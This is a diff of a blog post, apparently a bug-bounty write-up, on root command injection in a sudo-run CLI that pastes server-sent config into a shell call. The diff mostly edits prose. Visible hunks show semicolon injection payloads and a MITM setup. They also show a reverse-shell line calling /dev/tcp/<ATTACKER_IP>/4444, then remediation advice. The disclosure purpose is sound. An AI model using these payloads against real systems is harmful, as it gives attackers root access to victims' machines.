@@ -1,5 +1,5 @@
 ---
-title:       "When the server writes your command line: from a config field to root on your laptop"
+title:       "Root command injection over MITM: the server writes your command line"
 summary:     "A console tool running under sudo downloaded its configuration from the server and pasted it, verbatim, into a shell call. One semicolon in the right place and the attacker is root. Report accepted and rewarded."
 date:        2026-11-11 19:40:00 +0100
 lang:        en
@@ -61,8 +61,7 @@ def execute_command(cmd):
     ...
 ```
 
-<div class="plain" markdown="1">
-**In plain words:** `subprocess` is how Python runs programs. It can do it two ways, and
+`subprocess` is how Python runs programs. It can do it two ways, and
 the difference is everything:
 
 - **Without a shell** (`shell=False`): you pass a list — *"run the program `ping`, with the
@@ -73,7 +72,6 @@ the difference is everything:
   command ends here and another begins"*.
 
 The first option treats your data as data. The second treats it as **code**.
-</div>
 
 See for yourself, it takes ten seconds:
 
@@ -113,12 +111,10 @@ cmd = "sudo {} {} {}".format(binary, " ".join(parameters), filters)
 execute_command(cmd)      # <- shell=True
 ```
 
-<div class="plain" markdown="1">
-**In plain words:** the program asks the server "tell me how to connect". The server
+The program asks the server "tell me how to connect". The server
 answers with text. The program splits that text into pieces and **pastes them into the
 sentence** it is about to run as root. It does not check which options are valid, nor
 whether the values contain dangerous characters. Whatever the server says, runs.
-</div>
 
 Put another way: **the server has write access to your command line**.
 
@@ -174,12 +170,16 @@ echo "127.0.0.1  api.example.tld" | sudo tee -a /etc/hosts
 #     ...except the configuration request, which I answer myself
 ```
 
-<div class="plain" markdown="1">
-**In plain words:** I set up a fake server impersonating the vendor's. I forward almost
+I set up a fake server impersonating the vendor's. I forward almost
 everything to the real one so the application notices nothing odd: login works, the server
 list works, everything normal. **I intercept one single request**: the one carrying the
 configuration. That one I answer myself.
-</div>
+
+<figure>
+  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/05-mitm-en.svg' | relative_url }}"
+       alt="Diagram of the setup: the victim's client talks to the attacker's proxy, which forwards every request to the real server except the configuration one, whose response it replaces">
+  <figcaption>Three of the four requests pass untouched. Only the response that matters is replaced.</figcaption>
+</figure>
 
 {% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
 <figure>
@@ -205,12 +205,10 @@ Three pieces, each doing a job:
 | `; id > /tmp/pwn; touch /tmp/marker` | The **semicolons** close the previous command and open mine |
 | `#` | Comments out whatever the program appends afterwards, so it does not get in the way |
 
-<div class="plain" markdown="1">
-**In plain words:** the program was going to run `sudo binary --options...`. My text slips
+The program was going to run `sudo binary --options...`. My text slips
 into the middle, the semicolon cuts the sentence there, my commands run, and the hash makes
 the shell ignore the rest. It is exactly the same as a SQL injection, except the database
 is your operating system.
-</div>
 
 ## Firing it
 
@@ -228,13 +226,11 @@ program failed and, on failing, printed the command it had built**.
 </figure>
 {% endcomment %}
 
-<div class="plain" markdown="1">
-**In plain words:** the system binary died because the hash left its order half-finished. On
+The system binary died because the hash left its order half-finished. On
 dying, the program printed an error containing the full sentence it had tried to run —
 **with my payload inside, in plain sight**. The program's failure is the proof of the
 program's failure. That is gold for a report: you do not have to convince anyone of what
 happened, the tool shows it.
-</div>
 
 And the important bit: the commands **had already run** before the binary died. The shell
 interprets the list from left to right.
@@ -260,12 +256,10 @@ much* it hurts. So I swapped the payload for a **reverse shell**:
 cipher aes-256-gcm; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' & id > /tmp/pwn; #
 ```
 
-<div class="plain" markdown="1">
-**In plain words:** instead of creating a file, I tell the victim's computer to open a
+Instead of creating a file, I tell the victim's computer to open a
 connection **towards me** and hand me a console. From then on I type in my terminal and the
 commands run on their machine, as root. It is not a metaphor: it is their computer, on my
 screen.
-</div>
 
 {% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
 <figure>
@@ -289,12 +283,10 @@ cipher aes-256-gcm
 
 Result: no marker files, no connection, no execution. The application connects normally.
 
-<div class="plain" markdown="1">
-**In plain words:** if I remove the two semicolons and leave the normal configuration,
+If I remove the two semicolons and leave the normal configuration,
 absolutely nothing happens. That proves the bug is those characters reaching the shell
 unfiltered, and not something else about the setup — not my fake CA, not the proxy, not the
 virtual machine.
-</div>
 
 ## Impact
 
@@ -326,12 +318,10 @@ the server, and reject every other line. This matters especially with tools that
 options capable of running programs: if the server can send one of those, no injection is
 needed at all.
 
-<div class="plain" markdown="1">
-**In plain words:** filtering odd characters is not enough. There are configuration options
+Filtering odd characters is not enough. There are configuration options
 that **by design** execute programs. If you accept any option the server sends, the attacker
 needs no trick: they send you the legitimate option that runs their program. That is why the
 allowlist comes first and the filtering second.
-</div>
 
 **3. Pin the server's certificate** on every connection, not just some. Then a foreign CA —
 even one the system trusts — is not enough to impersonate the server.
